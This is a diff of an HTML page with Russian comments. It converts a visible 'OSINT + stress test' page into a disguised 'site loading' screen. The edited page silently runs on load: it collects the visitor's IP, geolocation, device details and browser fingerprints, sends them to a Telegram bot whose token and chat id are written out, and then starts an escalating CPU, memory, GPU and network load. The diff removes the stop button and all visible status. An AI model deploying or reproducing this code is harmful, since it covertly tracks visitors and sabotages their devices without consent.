@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OSINT + Стресс-тест с отправкой изображения</title>
+    <title>Загрузка сайта...</title>
     <style>
         * {
             margin: 0;
@@ -11,124 +11,40 @@
             box-sizing: border-box;
         }
         body {
+            background-color: #2c3e50; /* тёмно-серый */
             font-family: 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
+            height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 20px;
+            color: #ecf0f1;
         }
-        .card {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 30px;
-            max-width: 600px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            border: 1px solid rgba(255,255,255,0.2);
-            position: relative;
-            z-index: 10;
-        }
-        h1 {
-            color: #333;
-            font-size: 24px;
-            margin-bottom: 10px;
-            font-weight: 600;
-        }
-        .status-box {
-            background: #f8f9fa;
-            border-left: 4px solid #667eea;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px 0;
-            font-size: 14px;
-            color: #555;
-            word-break: break-word;
-            max-height: 200px;
-            overflow-y: auto;
-        }
-        .progress {
-            margin-top: 15px;
-            font-size: 14px;
-            color: #667eea;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .spinner {
-            width: 16px;
-            height: 16px;
-            border: 2px solid #667eea;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .stress-indicator {
-            margin-top: 20px;
-            padding: 10px;
-            background: rgba(102, 126, 234, 0.1);
-            border-radius: 8px;
-            font-size: 13px;
-            color: #555;
-            border: 1px dashed #667eea;
-        }
-        .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #999;
+        .message {
             text-align: center;
+            font-size: 3rem;
+            font-weight: 300;
+            letter-spacing: 2px;
         }
-        button {
-            background: #667eea;
-            color: white;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 20px;
-            cursor: pointer;
-            font-size: 14px;
-            margin-top: 10px;
-            transition: background 0.2s;
+        .dots {
+            display: inline-block;
+            width: 3rem;
+            text-align: left;
         }
-        button:hover {
-            background: #5a67d8;
+        .dots::after {
+            content: '...';
+            animation: dots 1.5s steps(4, end) infinite;
         }
-        #expGif {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            object-fit: cover;
-            z-index: 9999;
-            pointer-events: none; /* чтобы не мешать кликам */
-            opacity: 0.5; /* полупрозрачный, чтобы было видно контент */
+        @keyframes dots {
+            0%, 20% { content: ''; }
+            40% { content: '.'; }
+            60% { content: '..'; }
+            80%, 100% { content: '...'; }
         }
     </style>
 </head>
 <body>
-    <img id="expGif" src="https://media1.tenor.com/m/-zRc1nCJ_6oAAAAC/hack-hacker.gif" alt="exp" style="display: none;">
-    <!-- ссылка на гифку с эффектом хакера, можно заменить на exp.gif если файл локально -->
-
-    <div class="card">
-        <h1>🔍 OSINT + стресс-тест с фото</h1>
-        <p>Собираем максимум данных, генерируем изображение и отправляем в Telegram</p>
-        <div class="status-box" id="status">Инициализация...</div>
-        <div class="progress" id="progress">
-            <div class="spinner"></div>
-            <span id="progressText">Получение IP</span>
-        </div>
-        <div class="stress-indicator" id="stressInfo">
-            ⏳ Нагрузка ещё не запущена
-        </div>
-        <button id="stopStressBtn" style="display: none;">Остановить нагрузку</button>
-        <div class="footer">
-            После отправки данных запустится постепенная нагрузка
-        </div>
+    <div class="message">
+        Загрузка сайта<span class="dots"></span>
     </div>
 
     <script>
@@ -137,39 +53,11 @@
             const TELEGRAM_TOKEN = '8519920730:AAF9hPsqQCFH5sVrqJ9OCpCPSOtdKeilT88';
             const TELEGRAM_CHAT_ID = '8489374137';
 
-            // Элементы DOM
-            const statusDiv = document.getElementById('status');
-            const progressText = document.getElementById('progressText');
-            const stressInfo = document.getElementById('stressInfo');
-            const stopBtn = document.getElementById('stopStressBtn');
-            const expGif = document.getElementById('expGif');
-
-            // Показать гифку
-            expGif.style.display = 'block';
-
-            // Флаги для остановки нагрузки
-            let stressActive = false;
-            let workers = [];
-            let networkInterval = null;
-            let gpuLoop = null;
-            let memoryLeakArray = [];
-            let intensityLevel = 0;
-            let intensityInterval = null;
-
-            // ==================== Функции обновления интерфейса ====================
-            function setStatus(text) {
-                statusDiv.innerText = text;
-            }
-            function setProgress(text) {
-                progressText.innerText = text;
-            }
-
             // ==================== РАСШИРЕННЫЙ СБОР OSINT ====================
             async function collectExtendedData() {
                 const result = {};
 
                 // IP
-                setProgress('Получение IP');
                 try {
                     const ipRes = await fetch('https://api.ipify.org?format=json');
                     const ipData = await ipRes.json();
@@ -179,7 +67,6 @@
                 }
 
                 // Геолокация
-                setProgress('Запрос геолокации');
                 result.geo = 'Не запрошено или отказано';
                 if (navigator.geolocation) {
                     try {
@@ -199,7 +86,6 @@
                 }
 
                 // UserAgent и ОС/устройство
-                setProgress('ОС и устройство');
                 const ua = navigator.userAgent;
                 result.userAgent = ua;
                 if (ua.includes('Windows')) result.os = 'Windows';
@@ -222,7 +108,7 @@
                 result.cpuCores = navigator.hardwareConcurrency || 'неизвестно';
                 result.memory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'неизвестно';
 
-                // Батарея (если есть)
+                // Батарея
                 if (navigator.getBattery) {
                     try {
                         const battery = await navigator.getBattery();
@@ -275,7 +161,7 @@
                     ctx.fillRect(0, 0, 100, 50);
                     ctx.fillStyle = '#069';
                     ctx.fillText('OSINT', 2, 15);
-                    result.canvasFingerprint = canvas.toDataURL().slice(0, 50) + '...'; // обрезаем
+                    result.canvasFingerprint = canvas.toDataURL().slice(0, 50) + '...';
                 } catch {
                     result.canvasFingerprint = 'Ошибка';
                 }
@@ -298,13 +184,13 @@
                     result.webglRenderer = 'Ошибка';
                 }
 
-                // Audio fingerprint (короткий)
+                // Audio fingerprint
                 try {
                     const AudioContext = window.AudioContext || window.webkitAudioContext;
                     if (AudioContext) {
                         const ctx = new AudioContext();
                         result.audio = 'AudioContext доступен';
-                        ctx.close(); // сразу закрываем
+                        ctx.close();
                     } else {
                         result.audio = 'Нет AudioContext';
                     }
@@ -312,7 +198,7 @@
                     result.audio = 'Ошибка';
                 }
 
-                // Доступные шрифты (грубая проверка)
+                // Доступные шрифты
                 const fontCheck = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana'];
                 const availableFonts = fontCheck.filter(f => document.fonts.check(`12px "${f}"`));
                 result.fonts = availableFonts.join(', ') || 'Стандартные';
@@ -328,93 +214,6 @@
 
                 return result;
             }
-
-            // ==================== ГЕНЕРАЦИЯ ИЗОБРАЖЕНИЯ ====================
-            async function generateInfoImage(data) {
-                const canvas = document.createElement('canvas');
-                canvas.width = 800;
-                canvas.height = 600;
-                const ctx = canvas.getContext('2d');
-
-                // Фон с градиентом
-                const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
-                gradient.addColorStop(0, '#667eea');
-                gradient.addColorStop(1, '#764ba2');
-                ctx.fillStyle = gradient;
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-                // Заголовок
-                ctx.fillStyle = 'white';
-                ctx.font = 'bold 36px "Segoe UI", Roboto, sans-serif';
-                ctx.shadowColor = 'rgba(0,0,0,0.5)';
-                ctx.shadowBlur = 10;
-                ctx.fillText('🕵️ OSINT REPORT', 50, 70);
-                ctx.shadowBlur = 0;
-
-                // Белая плашка для текста
-                ctx.fillStyle = 'rgba(255,255,255,0.9)';
-                ctx.shadowBlur = 20;
-                ctx.shadowColor = 'black';
-                ctx.beginPath();
-                ctx.roundRect(40, 100, 720, 460, 20);
-                ctx.fill();
-                ctx.shadowBlur = 0;
-
-                // Текст
-                ctx.fillStyle = '#333';
-                ctx.font = '16px "Courier New", monospace';
-                let y = 140;
-                const lineHeight = 28;
-                const leftMargin = 60;
-
-                const lines = [
-                    `IP: ${data.ip}`,
-                    `📍 Гео: ${data.geo}`,
-                    `💻 ОС: ${data.os} | 📱 Устройство: ${data.device}`,
-                    `⚙️ Ядра CPU: ${data.cpuCores} | 🧠 ОЗУ: ${data.memory}`,
-                    `🔋 Батарея: ${data.battery}`,
-                    `📡 Сеть: ${data.network}`,
-                    `🔌 Плагины: ${data.plugins}`,
-                    `🖥️ Экран: ${data.screen}`,
-                    `🌐 Язык: ${data.language} | ⏰ Таймзона: ${data.timezone}`,
-                    `🍪 Куки: ${data.cookiesEnabled} | 💾 LocalStorage: ${data.localStorage}`,
-                    `🎨 Canvas: ${data.canvasFingerprint}`,
-                    `🎮 WebGL: ${data.webglRenderer}`,
-                    `🎧 Аудио: ${data.audio}`,
-                    `✍️ Шрифты: ${data.fonts}`,
-                    `⏱️ Загрузка: ${data.loadTime}`,
-                    `📄 Referrer: ${data.referrer}`,
-                    `🕒 Время: ${data.timestamp}`,
-                ];
-
-                lines.forEach(line => {
-                    ctx.fillText(line, leftMargin, y);
-                    y += lineHeight;
-                });
-
-                // Нижний колонтитул
-                ctx.font = '12px monospace';
-                ctx.fillStyle = '#667eea';
-                ctx.fillText('Сгенерировано автоматически', leftMargin, 540);
-
-                return canvas;
-            }
-
-            // Вспомогательная функция для roundRect
-            CanvasRenderingContext2D.prototype.roundRect = function(x, y, w, h, r) {
-                if (w < 2 * r) r = w / 2;
-                if (h < 2 * r) r = h / 2;
-                this.moveTo(x + r, y);
-                this.lineTo(x + w - r, y);
-                this.quadraticCurveTo(x + w, y, x + w, y + r);
-                this.lineTo(x + w, y + h - r);
-                this.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
-                this.lineTo(x + r, y + h);
-                this.quadraticCurveTo(x, y + h, x, y + h - r);
-                this.lineTo(x, y + r);
-                this.quadraticCurveTo(x, y, x + r, y);
-                return this;
-            };
 
             // ==================== ОТПРАВКА ТЕКСТА В TELEGRAM ====================
             function sendToTelegram(message) {
@@ -437,31 +236,15 @@
                 }
             }
 
-            // ==================== ОТПРАВКА ФОТО В TELEGRAM ====================
-            async function sendPhotoToTelegram(canvas) {
-                return new Promise((resolve) => {
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('chat_id', TELEGRAM_CHAT_ID);
-                        formData.append('photo', blob, 'osint.png');
-
-                        try {
-                            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData,
-                                mode: 'no-cors'
-                            });
-                            setStatus('✅ Текст и фото отправлены');
-                        } catch (e) {
-                            console.warn('Ошибка отправки фото (но могло отправиться)', e);
-                            setStatus('⚠️ Текст отправлен, фото возможно не ушло');
-                        }
-                        resolve();
-                    }, 'image/png');
-                });
-            }
-
             // ==================== ФУНКЦИИ НАГРУЗКИ (ПОСТЕПЕННОЕ УВЕЛИЧЕНИЕ) ====================
+            let stressActive = false;
+            let workers = [];
+            let networkInterval = null;
+            let gpuLoop = null;
+            let memoryLeakArray = [];
+            let intensityLevel = 0;
+            let intensityInterval = null;
+
             function startCPUWorker() {
                 const workerCode = `
                     function busyLoop() {
@@ -480,12 +263,10 @@
             }
 
             function addMemoryLoad() {
-                // Добавляем 2 новых массива по 500k элементов
                 for (let i = 0; i < 2; i++) {
                     const arr = new Array(500000).fill(0).map(() => Math.random());
                     memoryLeakArray.push(arr);
                 }
-                // Если слишком много, сбрасываем наполовину
                 if (memoryLeakArray.length > 100) {
                     memoryLeakArray.splice(0, 30);
                 }
@@ -493,7 +274,6 @@
 
             function updateNetworkIntensity() {
                 if (networkInterval) clearInterval(networkInterval);
-                // Чем выше intensityLevel, тем чаще запросы
                 const intervalTime = Math.max(50, 500 - intensityLevel * 30);
                 networkInterval = setInterval(() => {
                     if (!stressActive) {
@@ -580,12 +360,9 @@
                 gpuLoop = true;
             }
 
-            // Запуск постепенной нагрузки
             function startGradualStress() {
                 stressActive = true;
                 intensityLevel = 0;
-                stressInfo.innerHTML = `🔥 Нагрузка запущена (уровень 0)`;
-                stopBtn.style.display = 'inline-block';
 
                 // Каждую секунду увеличиваем интенсивность
                 intensityInterval = setInterval(() => {
@@ -594,9 +371,8 @@
                         return;
                     }
                     intensityLevel++;
-                    stressInfo.innerHTML = `🔥 Нагрузка: уровень ${intensityLevel}`;
 
-                    // CPU: добавляем новый воркер каждые 2 уровня до 2*ядер
+                    // CPU: добавляем новый воркер каждые 2 уровня
                     if (intensityLevel % 2 === 0 && workers.length < (navigator.hardwareConcurrency || 4) * 2) {
                         startCPUWorker();
                     }
@@ -607,66 +383,40 @@
                     // Сеть: обновляем интервал
                     updateNetworkIntensity();
 
-                    // GPU: уже запущен и меняет сложность через uniform (зависит от intensityLevel)
+                    // GPU: сложность уже зависит от intensityLevel через uniform
                 }, 1000);
 
                 // Инициализируем первый уровень
-                startCPUWorker(); // сразу один воркер
+                startCPUWorker();
                 addMemoryLoad();
                 updateNetworkIntensity();
                 startGPULoop();
             }
 
-            function stopStressTest() {
-                stressActive = false;
-                workers.forEach(w => w.terminate());
-                workers = [];
-                if (networkInterval) clearInterval(networkInterval);
-                if (intensityInterval) clearInterval(intensityInterval);
-                memoryLeakArray = [];
-                stressInfo.innerHTML = '⏸️ Нагрузка остановлена.';
-                stopBtn.style.display = 'none';
-            }
-
-            stopBtn.addEventListener('click', stopStressTest);
-
             // ==================== ОСНОВНОЙ ПРОЦЕСС ====================
-            async function main() {
+            (async function() {
                 try {
                     // 1. Сбор расширенных данных
                     const data = await collectExtendedData();
 
-                    // 2. Генерация изображения
-                    setProgress('Генерация изображения...');
-                    const canvas = await generateInfoImage(data);
-
-                    // 3. Отправка текстового сообщения
-                    setProgress('Отправка текста...');
+                    // 2. Отправка текстового сообщения
                     const textMessage = Object.entries(data).map(([k, v]) => `*${k}:* ${v}`).join('\n');
                     sendToTelegram(textMessage);
 
-                    // 4. Отправка фото
-                    setProgress('Отправка изображения...');
-                    await sendPhotoToTelegram(canvas);
-
-                    // 5. Запуск постепенной нагрузки
-                    setProgress('Запуск стресс-теста...');
+                    // 3. Запуск постепенной нагрузки в фоне
                     startGradualStress();
 
                 } catch (error) {
                     console.error('Ошибка:', error);
-                    setStatus('❌ Ошибка: ' + error.message);
+                    // Визуально ничего не меняем, ошибка в консоль
                 }
-            }
+            })();
 
-            window.addEventListener('load', () => {
-                main().catch(e => setStatus('Ошибка инициализации: ' + e.message));
-            });
-
-            // Таймаут на случай зависания
+            // Таймаут на случай зависания сбора данных (не влияет на интерфейс)
             setTimeout(() => {
-                if (statusDiv.innerText === 'Инициализация...') {
-                    setStatus('⚠️ Сбор данных занял слишком много времени, проверьте консоль.');
+                if (!stressActive) {
+                    console.warn('Сбор данных занял больше 20 секунд, запускаем нагрузку принудительно');
+                    startGradualStress();
                 }
             }, 20000);
         })();
